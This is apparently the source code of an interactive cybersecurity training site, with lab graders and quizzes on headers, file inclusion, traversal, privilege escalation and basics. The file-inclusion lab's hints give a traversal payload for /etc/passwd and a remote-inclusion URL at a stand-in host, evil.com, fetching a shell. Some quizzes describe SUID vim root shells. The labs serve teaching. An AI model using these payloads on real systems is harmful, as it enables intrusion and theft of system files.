                        <div class="terminal-header"><span class="terminal-dots">●●●</span> Security Headers Lab</div>
                        <div class="terminal-body">
                            <p style="font-size:0.85rem;margin-bottom:12px">Add the missing security headers (header: value):</p>
                            <div class="lab-field"><label>1. Prevent clickjacking</label><input class="lab-input" id="labMisc1" placeholder="Header: value"></div>
                            <div class="lab-field"><label>2. Prevent MIME sniffing</label><input class="lab-input" id="labMisc2" placeholder="Header: value"></div>
                            <div class="lab-field"><label>3. Force HTTPS</label><input class="lab-input" id="labMisc3" placeholder="Header: value"></div>
                            <button class="btn btn-primary" id="labMiscSubmit">Verify Headers</button>
                        </div>
                    </div>
                </div>
                <div class="lab-result hidden" id="labMiscResult"></div>
            </div>`;

        $('#labMiscSubmit').onclick = () => {
            const v1 = $('#labMisc1').value.toLowerCase(), v2 = $('#labMisc2').value.toLowerCase(), v3 = $('#labMisc3').value.toLowerCase();
            const c1 = v1.includes('x-frame-options') && (v1.includes('deny') || v1.includes('sameorigin'));
            const c2 = v2.includes('x-content-type-options') && v2.includes('nosniff');
            const c3 = v3.includes('strict-transport-security') && v3.includes('max-age');
            const score = [c1, c2, c3].filter(Boolean).length;
            const result = $('#labMiscResult');
            result.classList.remove('hidden');
            if (score === 3) {
                result.className = 'lab-result success';
                result.innerHTML = '✅ <strong>All correct!</strong> X-Frame-Options, X-Content-Type-Options, and Strict-Transport-Security are all properly configured.';
                submitLabResult(state.currentLesson, true);
            } else {
                result.className = 'lab-result failure';
                result.innerHTML = `❌ ${score}/3 correct. ${!c1 ? 'Clickjacking prevention: X-Frame-Options: DENY. ' : ''}${!c2 ? 'MIME sniffing: X-Content-Type-Options: nosniff. ' : ''}${!c3 ? 'HTTPS: Strict-Transport-Security: max-age=31536000.' : ''}`;
            }
        };
    }

    function labFileInclusion(pane) {
        pane.innerHTML = `
            <div class="lab-exercise">
                <div class="lab-briefing">
                    <div class="lab-objective"><div class="lab-obj-icon">🎯</div>
                        <div><h4>Objective: Exploit File Inclusion</h4>
                        <p>The page loader uses <code>include($_GET['page'])</code> without validation. Read the server's <code>/etc/passwd</code> file using Local File Inclusion, then attempt Remote File Inclusion.</p></div>
                    </div>
                    <div class="lab-rules">
                        <div class="rule"><span class="rule-icon">📋</span> The web root is at <code>/var/www/html/pages/</code></div>
                        <div class="rule"><span class="rule-icon">📋</span> PHP's <code>allow_url_include</code> is enabled (bad config!)</div>
                        <div class="rule"><span class="rule-icon">🏁</span> Success: Include a file outside the web root OR a remote file</div>
                    </div>
                </div>
                <div class="lab-workspace">
                    <div class="lab-terminal">
                        <div class="terminal-header"><span class="terminal-dots">●●●</span> File Inclusion Lab</div>
                        <div class="terminal-body">
                            <div class="lab-field"><label>Page Parameter (?page=)</label><input class="lab-input" id="labFiInput" placeholder="Enter file path…"></div>
                            <div class="lab-query-preview"><span class="preview-label">include() Call</span><div id="labFiPreview">include('');</div></div>
                            <button class="btn btn-primary" id="labFiSubmit">Load Page</button>
                        </div>
                    </div>
                </div>
                <div class="lab-result hidden" id="labFiResult"></div>
                <div class="lab-hints">
                    <button class="btn-hint" data-hint="1">💡 Hint 1 (LFI)</button>
                    <button class="btn-hint" data-hint="2">💡 Hint 2 (RFI)</button>
                    <div class="hint-box hidden" id="labFiHint"></div>
                </div>
            </div>`;

        const input = $('#labFiInput');
        input.oninput = () => { $('#labFiPreview').textContent = `include('${input.value}');`; };

        const hints = {
            '1': 'For LFI, use <code>../</code> to traverse directories. From <code>/var/www/html/pages/</code> you need to go up 4 levels to reach <code>/</code>. Try: <code>../../../../etc/passwd</code>',
            '2': 'For RFI, try including a URL: <code>https://evil.com/shell.php</code>. This works because <code>allow_url_include</code> is enabled.',
        };

        $$('.btn-hint').forEach((b) => { b.onclick = () => { const h = $('#labFiHint'); h.innerHTML = hints[b.dataset.hint]; h.classList.remove('hidden'); }; });

        $('#labFiSubmit').onclick = () => {
            const val = input.value;
            const result = $('#labFiResult');
            result.classList.remove('hidden');
            const hasLFI = val.includes('..') && (val.includes('etc/') || val.includes('var/') || val.includes('proc/'));
            const hasRFI = /^https?:\/\//i.test(val);
            if (hasLFI || hasRFI) {
                result.className = 'lab-result success';
                result.innerHTML = hasRFI
                    ? '✅ <strong>Success!</strong> You exploited Remote File Inclusion! The server fetched and executed code from an external source. In production, this would give you a web shell.'
                    : '✅ <strong>Success!</strong> You exploited Local File Inclusion! By traversing directories with <code>../</code>, you read files outside the web root.';
                submitLabResult(state.currentLesson, true);
            } else {
                result.className = 'lab-result failure';
                result.innerHTML = '❌ <strong>Not quite.</strong> You need to either traverse directories (LFI) to read system files like <code>/etc/passwd</code>, or include a remote URL (RFI).';
            }
        };
    }



    /* ============================================================
       GENERIC LAB HELPER
       ============================================================ */
    function labGeneric(pane, title, question, answers, correctIdx) {
        var html = '<div class="lab-exercise"><div class="lab-header"><span class="lab-badge lab-badge-challenge">LAB</span><span class="lab-title">'+title+'</span></div><div class="lab-body"><p>'+question+'</p><div class="lab-options">';
        answers.forEach(function(a, i) {
            html += '<button class="lab-option" data-idx="'+i+'">'+a+'</button>';
        });
        html += '</div><div id="labFeedback" class="lab-feedback" style="display:none"></div></div></div>';
        pane.innerHTML = html;
        $$('.lab-option').forEach(function(btn) {
            btn.onclick = function() {
                $$('.lab-option').forEach(function(x){x.classList.remove('selected','correct','wrong');});
                var idx = +btn.dataset.idx;
                if (idx === correctIdx) {
                    btn.classList.add('correct');
                    $('#labFeedback').style.display = 'block';
                    $('#labFeedback').innerHTML = '<span style="color:var(--success)">Correct!</span>';
                    $('#labFeedback').className = 'lab-feedback lab-feedback-success';
                } else {
                    btn.classList.add('wrong');
                    $('#labFeedback').style.display = 'block';
                    $('#labFeedback').innerHTML = '<span style="color:var(--danger)">Incorrect. Try again!</span>';
                    $('#labFeedback').className = 'lab-feedback lab-feedback-error';
                }
            };
        });
    }

    /* C1 LABS */
    function labBoard(pane) {
        labGeneric(pane, 'Motherboard Form Factors',
            'Which motherboard form factor is the SMALLEST?',
            ['ATX', 'E-ATX', 'Micro-ATX', 'Mini-ITX'], 3);
    }

    function labCPU(pane) {
        labGeneric(pane, 'CPU Architecture',
            'What does the CPU do during a context switch?',
            ['Saves the current process state and loads the next process', 'Shuts down unused cores', 'Increases clock speed', 'Formats the L1 cache'], 0);
    }

    function labRAM(pane) {
        labGeneric(pane, 'Memory Types',
            'Which type of memory is VOLATILE (loses data when powered off)?',
            ['SSD', 'HDD', 'RAM', 'ROM'], 2);
    }

    function labBinary(pane) {
        pane.innerHTML = '<div class="lab-exercise"><div class="lab-header"><span class="lab-badge lab-badge-challenge">LAB</span><span class="lab-title">Binary Conversion Challenge</span></div><div class="lab-body"><p>Convert the binary number <code style="font-size:1.2rem">11001010</code> to decimal:</p><div style="display:flex;gap:8px;align-items:center;justify-content:center;margin:16px 0"><input id="labBinIn" type="number" style="width:100px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono);font-size:1.1rem;text-align:center" placeholder="?"><button class="demo-btn" id="labBinCheck">Check</button></div><div id="labBinFeedback" style="text-align:center;font-size:0.9rem"></div></div></div>';
        $('#labBinCheck').onclick = function() {
            var ans = +$('#labBinIn').value;
            if (ans === 202) $('#labBinFeedback').innerHTML = '<span style="color:var(--success)">Correct! 11001010 = 128+64+8+2 = 202</span>';
            else $('#labBinFeedback').innerHTML = '<span style="color:var(--danger)">Not quite. Hint: 128+64+0+0+8+0+2+0 = ?</span>';
        };
    }

    function labASCII(pane) {
        pane.innerHTML = '<div class="lab-exercise"><div class="lab-header"><span class="lab-badge lab-badge-challenge">LAB</span><span class="lab-title">ASCII Decode Challenge</span></div><div class="lab-body"><p>Decode these ASCII values to reveal the word:</p><p style="font-family:var(--font-mono);font-size:1.2rem;text-align:center">72 65 76 76 79</p><div style="display:flex;gap:8px;align-items:center;justify-content:center;margin:16px 0"><input id="labAscIn" style="width:150px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono);font-size:1.1rem;text-align:center" placeholder="?"><button class="demo-btn" id="labAscCheck">Check</button></div><div id="labAscFeedback" style="text-align:center"></div></div></div>';
        $('#labAscCheck').onclick = function() {
            var ans = $('#labAscIn').value.trim().toLowerCase();
            if (ans === 'hello') $('#labAscFeedback').innerHTML = '<span style="color:var(--success)">Correct! H(72) e(101) l(108) l(108) o(111) = Hello</span>';
            else $('#labAscFeedback').innerHTML = '<span style="color:var(--danger)">Not quite. Convert each number to its ASCII character.</span>';
        };
    }

    function labBase64(pane) {
        pane.innerHTML = '<div class="lab-exercise"><div class="lab-header"><span class="lab-badge lab-badge-challenge">LAB</span><span class="lab-title">Base64 Decode Challenge</span></div><div class="lab-body"><p>Decode this Base64 string to find the hidden message:</p><p style="font-family:var(--font-mono);font-size:1.1rem;text-align:center;background:var(--bg-secondary);padding:12px;border-radius:8px">U2VjdXJpdHlMYWI=</p><div style="display:flex;gap:8px;align-items:center;justify-content:center;margin:16px 0"><input id="labB64In" style="width:200px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono);text-align:center" placeholder="Decoded text"><button class="demo-btn" id="labB64Check">Check</button></div><div id="labB64Feedback" style="text-align:center"></div></div></div>';
        $('#labB64Check').onclick = function() {
            var ans = $('#labB64In').value.trim();
            if (ans === 'SecurityLab') $('#labB64Feedback').innerHTML = '<span style="color:var(--success)">Correct! Base64 is encoding, NOT encryption.</span>';
            else $('#labB64Feedback').innerHTML = '<span style="color:var(--danger)">Try again. Use atob() in your browser console or a Base64 decoder.</span>';
        };
    }

    function labFileHeaders(pane) {
        labGeneric(pane, 'File Magic Numbers',
            'A file named "resume.pdf" has magic bytes: <code>4D 5A 90 00</code>. What is it really?',
            ['A valid PDF document', 'A JPEG image', 'A Windows executable (.exe)', 'A ZIP archive'], 2);
    }

    function labLogicGates(pane) {
        pane.innerHTML = '<div class="lab-exercise"><div class="lab-header"><span class="lab-badge lab-badge-challenge">LAB</span><span class="lab-title">Logic Gate Challenge</span></div><div class="lab-body"><p>Solve: What is the output of <code>(1 XOR 1) AND (0 OR 1)</code>?</p><div style="display:flex;gap:12px;justify-content:center;margin:16px 0"><button class="lab-option" data-v="0">0</button><button class="lab-option" data-v="1">1</button></div><div id="labGateFeedback" style="text-align:center"></div></div></div>';
        $$('.lab-option').forEach(function(b) {
            b.onclick = function() {
                $$('.lab-option').forEach(function(x){x.classList.remove('correct','wrong');});
                if (b.dataset.v === '0') { b.classList.add('correct'); $('#labGateFeedback').innerHTML = '<span style="color:var(--success)">Correct! (1 XOR 1) = 0, (0 OR 1) = 1, 0 AND 1 = 0</span>'; }
                else { b.classList.add('wrong'); $('#labGateFeedback').innerHTML = '<span style="color:var(--danger)">Incorrect. Work through each operation step by step.</span>'; }
            };
        });
    }

    function labXOR(pane) {
        pane.innerHTML = '<div class="lab-exercise"><div class="lab-header"><span class="lab-badge lab-badge-challenge">LAB</span><span class="lab-title">XOR Decryption Challenge</span></div><div class="lab-body"><p>A message was XOR encrypted with key <code>0x42</code> (66 decimal). The ciphertext bytes are:</p><p style="font-family:var(--font-mono);text-align:center;background:var(--bg-secondary);padding:8px;border-radius:8px">0A 27 2D 2D 2E</p><div style="display:flex;gap:8px;align-items:center;justify-content:center;margin:16px 0"><input id="labXorIn" style="width:150px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono);text-align:center" placeholder="Decrypted"><button class="demo-btn" id="labXorCheck">Check</button></div><div id="labXorFeedback" style="text-align:center"></div></div></div>';
        $('#labXorCheck').onclick = function() {
            var ans = $('#labXorIn').value.trim();
            if (ans.toLowerCase() === 'hello') $('#labXorFeedback').innerHTML = '<span style="color:var(--success)">Correct! XOR each byte with 0x42: 0A^42=48(H), 27^42=65(e)...</span>';
            else $('#labXorFeedback').innerHTML = '<span style="color:var(--danger)">XOR each ciphertext byte with the key 0x42 to get the plaintext.</span>';
        };
    }

    function labFS(pane) {
        labGeneric(pane, 'File Systems',
            'What is the maximum file size on a FAT32 filesystem?',
            ['2 GB', '4 GB', '16 TB', 'No limit'], 1);
    }

    function labCloud(pane) {
        labGeneric(pane, 'Cloud Service Models',
            'In which cloud model does the provider manage EVERYTHING including the application?',
            ['IaaS', 'PaaS', 'SaaS', 'On-Premises'], 2);
    }

    /* C2 LABS */
    function labOS(pane) {
        labGeneric(pane, 'Operating Systems',
            'Which component of the OS manages hardware access and runs in ring 0?',
            ['Shell', 'Desktop Environment', 'Kernel', 'Package Manager'], 2);
    }

    function labVM(pane) {
        labGeneric(pane, 'Virtualization',
            'Which hypervisor type runs directly on hardware without a host OS?',
            ['Type 1 (Bare-Metal)', 'Type 2 (Hosted)', 'Container Engine', 'Application VM'], 0);
    }

    /* C3 LABS */
    function labTerminal(pane) {
        pane.innerHTML = '<div class="lab-exercise"><div class="lab-header"><span class="lab-badge lab-badge-challenge">LAB</span><span class="lab-title">Terminal Command Challenge</span></div><div class="lab-body"><p>What command lists all files (including hidden ones) in long format?</p><div style="display:flex;gap:8px;align-items:center;justify-content:center;margin:16px 0"><input id="labTermIn" style="width:180px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono)" placeholder="ls ..."><button class="demo-btn" id="labTermCheck">Check</button></div><div id="labTermFeedback" style="text-align:center"></div></div></div>';
        $('#labTermCheck').onclick = function() {
            var ans = $('#labTermIn').value.trim();
            if (ans === 'ls -la' || ans === 'ls -al' || ans === 'ls -lah' || ans === 'ls -alh') $('#labTermFeedback').innerHTML = '<span style="color:var(--success)">Correct! -l for long format, -a for all (hidden files).</span>';
            else $('#labTermFeedback').innerHTML = '<span style="color:var(--danger)">Hint: Use ls with -l (long) and -a (all) flags.</span>';
        };
    }

    function labSudo(pane) {
        labGeneric(pane, 'sudo vs su',
            'What is the SECURITY advantage of sudo over su?',
            ['sudo is faster', 'sudo provides an audit trail and only runs one command as root', 'sudo does not require a password', 'su is deprecated'], 1);
    }

    function labFolders(pane) {
        labGeneric(pane, 'Linux Directories',
            'Which directory contains system configuration files like /etc/passwd?',
            ['/bin', '/home', '/etc', '/var'], 2);
    }

    function labPermissions(pane) {
        pane.innerHTML = '<div class="lab-exercise"><div class="lab-header"><span class="lab-badge lab-badge-challenge">LAB</span><span class="lab-title">File Permissions Challenge</span></div><div class="lab-body"><p>A file has permissions: <code>-rw-r-----</code>. What is the numeric (octal) value?</p><div style="display:flex;gap:8px;align-items:center;justify-content:center;margin:16px 0"><input id="labPermIn" type="number" style="width:80px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono);font-size:1.2rem;text-align:center" placeholder="???"><button class="demo-btn" id="labPermCheck">Check</button></div><div id="labPermFeedback" style="text-align:center"></div></div></div>';
        $('#labPermCheck').onclick = function() {
            var ans = +$('#labPermIn').value;
            if (ans === 640) $('#labPermFeedback').innerHTML = '<span style="color:var(--success)">Correct! rw- = 4+2+0 = 6, r-- = 4+0+0 = 4, --- = 0+0+0 = 0 = 640</span>';
            else $('#labPermFeedback').innerHTML = '<span style="color:var(--danger)">Hint: r=4, w=2, x=1. Calculate for owner(rw-), group(r--), others(---).</span>';
        };
    }

    function labEnv(pane) {
        labGeneric(pane, 'Environment Variables',
            'Why is storing secrets in environment variables risky?',
            ['They are encrypted', 'Any process can read them with env or /proc', 'They are deleted on logout', 'They only work in bash'], 1);
    }

    function labFileOps2(pane) {
        labGeneric(pane, 'File Operations',
            'What does <code>rm -rf /</code> do?',
            ['Removes read-only files', 'Recursively force-deletes EVERYTHING from root', 'Restores factory defaults', 'Removes recent files'], 1);
    }

    function labSearch2(pane) {
        pane.innerHTML = '<div class="lab-exercise"><div class="lab-header"><span class="lab-badge lab-badge-challenge">LAB</span><span class="lab-title">Search Command Challenge</span></div><div class="lab-body"><p>Write a command to find all files containing the word "password" in /var/www:</p><div style="display:flex;gap:8px;align-items:center;justify-content:center;margin:16px 0"><input id="labSearchIn" style="width:280px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono);font-size:0.85rem" placeholder="grep ..."><button class="demo-btn" id="labSearchCheck">Check</button></div><div id="labSearchFeedback" style="text-align:center"></div></div></div>';
        $('#labSearchCheck').onclick = function() {
            var ans = $('#labSearchIn').value.trim();
            if (ans.indexOf('grep') >= 0 && ans.indexOf('-r') >= 0 && ans.indexOf('password') >= 0) $('#labSearchFeedback').innerHTML = '<span style="color:var(--success)">Correct! grep -r recursively searches for patterns in files.</span>';
            else $('#labSearchFeedback').innerHTML = '<span style="color:var(--danger)">Hint: grep -r "password" /var/www</span>';
        };
    }

    function labProcess2(pane) {
        labGeneric(pane, 'Process Management',
            'How do you force-kill a process with PID 1234?',
            ['stop 1234', 'kill -9 1234', 'delete 1234', 'end 1234'], 1);
    }

    function labPipes2(pane) {
        labGeneric(pane, 'Pipes and Redirects',
            'What does <code>2>/dev/null</code> do?',
            ['Redirects stdout to null', 'Redirects stderr to null (suppresses errors)', 'Deletes /dev/null', 'Copies 2 bytes to null'], 1);
    }

    function labSSH2(pane) {
        labGeneric(pane, 'SSH Security',
            'Which SSH authentication method is MORE SECURE than passwords?',
            ['Telnet', 'Public key authentication', 'FTP login', 'HTTP Basic Auth'], 1);
    }

    /* C4 LABS */
    function labDorks(pane) {
        pane.innerHTML = '<div class="lab-exercise"><div class="lab-header"><span class="lab-badge lab-badge-challenge">LAB</span><span class="lab-title">Google Dork Challenge</span></div><div class="lab-body"><p>Write a Google dork to find PDF files on <code>target.com</code>:</p><div style="display:flex;gap:8px;align-items:center;justify-content:center;margin:16px 0"><input id="labDorkIn" style="width:280px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono);font-size:0.85rem" placeholder="site:..."><button class="demo-btn" id="labDorkCheck">Check</button></div><div id="labDorkFeedback" style="text-align:center"></div></div></div>';
        $('#labDorkCheck').onclick = function() {
            var ans = $('#labDorkIn').value.trim().toLowerCase();
            if (ans.indexOf('site:target.com') >= 0 && ans.indexOf('filetype:pdf') >= 0) $('#labDorkFeedback').innerHTML = '<span style="color:var(--success)">Correct! site: limits to domain, filetype: filters by extension.</span>';
            else $('#labDorkFeedback').innerHTML = '<span style="color:var(--danger)">Hint: Combine site:target.com with filetype:pdf</span>';
        };
    }

    function labHTTP2(pane) {
        labGeneric(pane, 'HTTP Methods',
            'Which HTTP status code indicates the server crashed?',
            ['200 OK', '301 Redirect', '404 Not Found', '500 Internal Server Error'], 3);
    }

    function labCookies2(pane) {
        labGeneric(pane, 'Cookie Security',
            'Which cookie flag prevents JavaScript from reading the cookie?',
            ['Secure', 'SameSite', 'HttpOnly', 'Path'], 2);
    }

    /* C5 LABS */
    function labHardware2(pane) {
        labGeneric(pane, 'Network Hardware',
            'Which network device sends data only to the correct port using MAC addresses?',
            ['Hub', 'Switch', 'Repeater', 'Modem'], 1);
    }

    function labIP2(pane) {
        pane.innerHTML = '<div class="lab-exercise"><div class="lab-header"><span class="lab-badge lab-badge-challenge">LAB</span><span class="lab-title">IP Address Classification</span></div><div class="lab-body"><p>Is the IP address <code>172.20.10.5</code> public or private?</p><div style="display:flex;gap:12px;justify-content:center;margin:16px 0"><button class="lab-option" data-v="pub">Public</button><button class="lab-option" data-v="priv">Private</button></div><div id="labIPFeedback" style="text-align:center"></div></div></div>';
        $$('.lab-option').forEach(function(b) {
            b.onclick = function() {
                $$('.lab-option').forEach(function(x){x.classList.remove('correct','wrong');});
                if (b.dataset.v === 'priv') { b.classList.add('correct'); $('#labIPFeedback').innerHTML = '<span style="color:var(--success)">Correct! 172.16.0.0 - 172.31.255.255 is private (Class B)</span>'; }
                else { b.classList.add('wrong'); $('#labIPFeedback').innerHTML = '<span style="color:var(--danger)">Hint: Check if 172.20.x.x falls in the 172.16-31 private range.</span>'; }
            };
        });
    }

    function labTCPUDP2(pane) {
        labGeneric(pane, 'TCP vs UDP',
            'Which protocol is used for live video streaming and why?',
            ['TCP - reliability matters most', 'UDP - speed matters, occasional packet loss is acceptable', 'ICMP - it handles multimedia', 'HTTP - it supports video'], 1);
    }

    function labSubnet2(pane) {
        pane.innerHTML = '<div class="lab-exercise"><div class="lab-header"><span class="lab-badge lab-badge-challenge">LAB</span><span class="lab-title">Subnet Challenge</span></div><div class="lab-body"><p>How many usable host addresses are in a /28 subnet?</p><div style="display:flex;gap:8px;align-items:center;justify-content:center;margin:16px 0"><input id="labSubIn" type="number" style="width:80px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono);font-size:1.2rem;text-align:center" placeholder="?"><button class="demo-btn" id="labSubCheck">Check</button></div><div id="labSubFeedback" style="text-align:center"></div></div></div>';
        $('#labSubCheck').onclick = function() {
            var ans = +$('#labSubIn').value;
            if (ans === 14) $('#labSubFeedback').innerHTML = '<span style="color:var(--success)">Correct! 2^(32-28) - 2 = 16 - 2 = 14 usable hosts</span>';
            else $('#labSubFeedback').innerHTML = '<span style="color:var(--danger)">Hint: 2^(32-CIDR) - 2 (subtract network and broadcast)</span>';
        };
    }

    function labSPF2(pane) {
        labGeneric(pane, 'Email Security',
            'What does SPF (Sender Policy Framework) prevent?',
            ['Spam emails', 'Email spoofing by checking sender IP', 'Phishing links in emails', 'Encrypted email interception'], 1);
    }

    function labDNS2(pane) {
        labGeneric(pane, 'DNS Records',
            'Which DNS record type maps a domain name to an IPv4 address?',
            ['MX', 'NS', 'A', 'CNAME'], 2);
    }

    function labOSI2(pane) {
        labGeneric(pane, 'OSI Model',
            'At which OSI layer does TCP operate?',
            ['Layer 2 - Data Link', 'Layer 3 - Network', 'Layer 4 - Transport', 'Layer 7 - Application'], 2);
    }

    function labDoS2(pane) {
        labGeneric(pane, 'DoS/DDoS Attacks',
            'What makes a DDoS attack different from a DoS attack?',
            ['DDoS uses encryption', 'DDoS originates from multiple sources (botnet)', 'DDoS is legal', 'DDoS only targets DNS'], 1);
    }

    /* C6 NEW LABS */
    function labSession(pane) {
        labGeneric(pane, 'Session Security',
            'Which session ID format is most resistant to brute-force attacks?',
            ['Sequential integers (1001, 1002, 1003)', 'Timestamp-based (20240101120000)', '128-bit cryptographic random token', 'Username-based (admin-session)'], 2);
    }

    function labClickjack(pane) {
        labGeneric(pane, 'Clickjacking Defense',
            'Which HTTP header prevents your page from being loaded in an iframe?',
            ['Content-Type', 'X-Frame-Options: DENY', 'Cache-Control', 'Accept-Encoding'], 1);
    }

    function labDirTraversal(pane) {
        pane.innerHTML = '<div class="lab-exercise"><div class="lab-header"><span class="lab-badge lab-badge-challenge">LAB</span><span class="lab-title">Directory Traversal Challenge</span></div><div class="lab-body"><p>A web app serves files from <code>/var/www/uploads/</code>. Craft a path to read <code>/etc/passwd</code>:</p><div style="display:flex;gap:8px;align-items:center;justify-content:center;margin:16px 0"><span style="font-family:var(--font-mono);font-size:0.85rem">/var/www/uploads/</span><input id="labDTIn" style="width:200px;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono)" placeholder="??"><button class="demo-btn" id="labDTCheck">Check</button></div><div id="labDTFeedback" style="text-align:center"></div></div></div>';
        $('#labDTCheck').onclick = function() {
            var ans = $('#labDTIn').value.trim();
            if (ans.indexOf('..') >= 0 && ans.indexOf('etc/passwd') >= 0) $('#labDTFeedback').innerHTML = '<span style="color:var(--success)">Correct! ../../../etc/passwd traverses up from uploads to read system files.</span>';
            else $('#labDTFeedback').innerHTML = '<span style="color:var(--danger)">Hint: Use ../ to go up directories until you reach the root.</span>';
        };
    }

    function labUpload(pane) {
        labGeneric(pane, 'File Upload Security',
            'Which is the MOST effective defense against malicious file uploads?',
            ['Check file extension only', 'Check MIME type only', 'Validate magic bytes, use allowlist, rename files, store outside webroot', 'Limit file size to 1 MB'], 2);
    }

    function labBOF2(pane) {
        labGeneric(pane, 'Buffer Overflow',
            'In a buffer overflow attack, what is the attacker trying to overwrite?',
            ['The hard drive', 'The return address (EIP) to redirect execution', 'The network buffer', 'The CPU cache'], 1);
    }

    function labIntOverflow(pane) {
        labGeneric(pane, 'Integer Overflow',
            'What happens when you add 1 to an unsigned 8-bit integer storing 255?',
            ['It becomes 256', 'It wraps to 0 (overflow)', 'It stays at 255', 'It crashes the program'], 1);
    }

    function labMSF(pane) {
        pane.innerHTML = '<div class="lab-exercise"><div class="lab-header"><span class="lab-badge lab-badge-challenge">LAB</span><span class="lab-title">Metasploit Challenge</span></div><div class="lab-body"><p>Put these Metasploit steps in the correct order:</p><div style="display:flex;flex-direction:column;gap:8px;margin:16px 0" id="msfSteps"></div><div id="labMSFFeedback" style="text-align:center;margin-top:8px"></div></div></div>';
        var steps = ['search (find exploit)', 'use (select module)', 'set RHOSTS (target)', 'exploit (launch)'];
        var shuffled = steps.slice().sort(function(){return Math.random()-0.5;});
        var selected = [];
        var cont = $('#msfSteps');
        function renderMSF() {
            cont.innerHTML = '';
            shuffled.forEach(function(s) {
                if (selected.indexOf(s) < 0) cont.innerHTML += '<button class="demo-btn demo-btn-sm msfStep" style="text-align:left">'+s+'</button>';
            });
            if (selected.length) cont.innerHTML += '<div style="margin-top:8px;font-family:var(--font-mono);font-size:0.85rem">Order: ' + selected.join(' -> ') + '</div>';
            if (selected.length === 4) {
                var correct = selected.every(function(s,i){return s===steps[i];});
                $('#labMSFFeedback').innerHTML = correct ? '<span style="color:var(--success)">Correct order!</span>' : '<span style="color:var(--danger)">Wrong order. Click to try again.</span>';
                if (!correct) { selected = []; setTimeout(renderMSF, 1500); }
            }
            $$('.msfStep').forEach(function(b) { b.onclick = function() { selected.push(b.textContent); renderMSF(); }; });
        }
        renderMSF();
    }

    function labPhishing2(pane) {
        labGeneric(pane, 'Phishing Detection',
            'Which email address is MOST likely a phishing attempt?',
            ['support@microsoft.com', 'noreply@amaz0n-verify.com', 'admin@company.org', 'help@google.com'], 1);
    }

    function labPrivEsc2(pane) {
        labGeneric(pane, 'Privilege Escalation',
            'After getting a low-privilege shell, what is the FIRST thing to check for privilege escalation on Linux?',
            ['Check if Chrome is installed', 'Run sudo -l and find SUID binaries', 'Restart the server', 'Install a GUI'], 1);
    }

    function labSUID2(pane) {
        labGeneric(pane, 'SUID Exploitation',
            'If /usr/bin/vim has the SUID bit set and runs as root, how can you escalate?',
            ['Delete vim', 'Run vim then :!bash to get a root shell', 'Read vim documentation', 'vim cannot be exploited'], 1);
    }

    function labWinPrivEsc2(pane) {
        labGeneric(pane, 'Windows Priv Esc',
            'What is the "Unquoted Service Path" vulnerability?',
            ['A service runs with no quotes around its path, allowing an attacker to place a malicious executable in a directory that Windows tries first', 'A missing environment variable', 'A registry corruption', 'A DLL versioning issue'], 0);
    }

    /* C7 SERVER LABS */
    function labServerIntro(pane) {
        labGeneric(pane, 'Server Fundamentals',
            'What is the primary difference between a server and a desktop computer?',
            ['Servers have larger monitors', 'Servers are designed to run 24/7 and serve multiple clients', 'Servers have better graphics cards', 'Servers cannot run operating systems'], 1);
    }

    function labWebServer(pane) {
        labGeneric(pane, 'Web Servers',
            'When a web server receives a request for "index.php", what happens?',
            ['The file is sent directly to the client', 'The PHP interpreter processes the file and sends HTML to the client', 'The server crashes', 'The client must have PHP installed'], 1);
    }

    function labDBServer(pane) {
        labGeneric(pane, 'Database Servers',
            'What is the main benefit of creating an index on a database column?',
            ['It makes backups faster', 'It significantly speeds up queries that filter by that column', 'It automatically encrypts data', 'It reduces disk space usage'], 1);
    }

    function labDNSServer(pane) {
        labGeneric(pane, 'DNS Servers',
            'What DNS record type would you use to point a domain to an IPv4 address?',
            ['MX', 'CNAME', 'A', 'TXT'], 2);
    }

    function labLogServer(pane) {
        labGeneric(pane, 'Log Servers',
            'What does SIEM stand for and what does it combine?',
            ['Security Information Event Management - combines firewalls and antivirus', 'Security Information & Event Management - combines SIM (log storage) and SEM (real-time monitoring)', 'Server Integration Enterprise Management', 'System Intrusion Event Monitoring'], 1);
    }

    function labEmailServer(pane) {
        labGeneric(pane, 'Email Servers',
            'Which protocol is used to SEND emails from a client to a mail server?',
            ['POP3', 'IMAP', 'SMTP', 'HTTP'], 2);
    }

    /* C8 ADVANCED HARDWARE LABS */
    function labCPUArch(pane) {
        labGeneric(pane, 'CPU Architecture',
            'What register holds the address of the next instruction to execute?',
            ['RAX (Accumulator)', 'RSP (Stack Pointer)', 'RIP (Instruction Pointer)', 'RBX (Base)'], 2);
    }

    function labGDB(pane) {
        labGeneric(pane, 'GDB Debugging',
            'What GDB command shows the values of all CPU registers?',
            ['show regs', 'info registers', 'display cpu', 'print $regs'], 1);
    }

    function labRAID(pane) {
        labGeneric(pane, 'RAID Storage',
            'Which RAID level provides striping (performance) with NO redundancy?',
            ['RAID 1', 'RAID 5', 'RAID 0', 'RAID 10'], 2);
    }

    function labDocker(pane) {
        labGeneric(pane, 'Docker Containers',
            'What Docker command runs a container in the background (detached mode)?',
            ['docker run -b', 'docker run -d', 'docker run --background', 'docker start -d'], 1);
    }

    /* C9 SECURITY CONCEPTS LABS */
    function labEncryption(pane) {
        labGeneric(pane, 'Encryption',
            'What is the key difference between symmetric and asymmetric encryption?',
            ['Symmetric is faster but uses the same key for encrypt/decrypt; Asymmetric uses a key pair (public/private)', 'Asymmetric can only decrypt, not encrypt', 'Symmetric requires the internet to work', 'They are the same thing'], 0);
    }

    function labForensics(pane) {
        labGeneric(pane, 'Digital Forensics',
            'Why is "Chain of Custody" important in digital forensics?',
            ['It speeds up the investigation', 'It documents who handled evidence and when, ensuring admissibility in court', 'It prevents the suspect from being arrested', 'It is only required for physical evidence'], 1);
    }

    function labRecon(pane) {
        labGeneric(pane, 'Reconnaissance',
            'What tool would you use to enumerate DNS records for a target domain?',
            ['Wireshark', 'dig or dnsrecon', 'Photoshop', 'Microsoft Word'], 1);
    }

    function labSecDistros(pane) {
        labGeneric(pane, 'Security Distributions',
            'Which Linux distribution is specifically designed for digital forensics (by SANS)?',
